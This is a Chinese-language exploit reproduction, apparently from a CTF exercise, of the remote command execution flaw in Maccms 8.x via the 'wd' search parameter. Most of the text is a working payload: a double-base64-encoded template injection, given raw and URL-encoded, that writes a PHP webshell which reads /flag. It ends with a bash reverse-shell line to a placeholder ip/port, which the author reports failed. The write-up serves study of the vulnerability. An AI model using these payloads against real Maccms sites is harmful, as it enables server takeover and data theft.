## 1. 漏洞介绍

Maccms是一套跨平台的基于PHP和MySQL快速建站系统。 Maccms 8.x版本中存在安全漏洞。远程攻击者可借助index.php?m=vod-search请求中的‘wd’参数利用该漏洞执行命令。

[Maccms8.x 远程命令执行漏洞分析 - yunying - 博客园](https://www.cnblogs.com/BOHB-yunying/p/13655030.html)

## 2. 漏洞复现

直接读取 flag

shell.php

```php
<?php passthru('cat /flag'); phpinfo();?> 1
```

两次base64编码后

```
UEQ5d2FIQWdjR0Z6YzNSb2NuVW9KMk5oZENBdlpteGhaeWNwT3lCd2FIQnBibVp2S0NrN1B6NGdNUT09
```

**注**，为啥要两次base64编码，待调试分析【后补】，经测试发现编码后有 = 不能成功！

写个shell.php【文件名base64编码后c2hlbGwucGhw】

```python
wd={if-A:print(fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdjR0Z6YzNSb2NuVW9KMk5oZENBdlpteGhaeWNwT3lCd2FIQnBibVp2S0NrN1B6NGdNUT09))))}{endif-A}
```

POST提交时先url编码下，即

```python
wd=%7Bif-A:print(fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdjR0Z6YzNSb2NuVW9KMk5oZENBdlpteGhaeWNwT3lCd2FIQnBibVp2S0NrN1B6NGdNUT09))))%7D%7Bendif-A%7D
```

访问 shell.php

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312160117450.png)

尝试写个下面的反弹 shell，成功不了，写了个一句话木马，用蚁剑在终端试了下是执行sh用的是/bin/dash，进一步尝试用 ln 指向 /bin/bash，奈何权限不足，虽然服务端也有nc，但由于版本关系没有 `-e` ……

```php
<?php system("bash -i >& /dev/tcp/ip/port 0>&1");?>
```
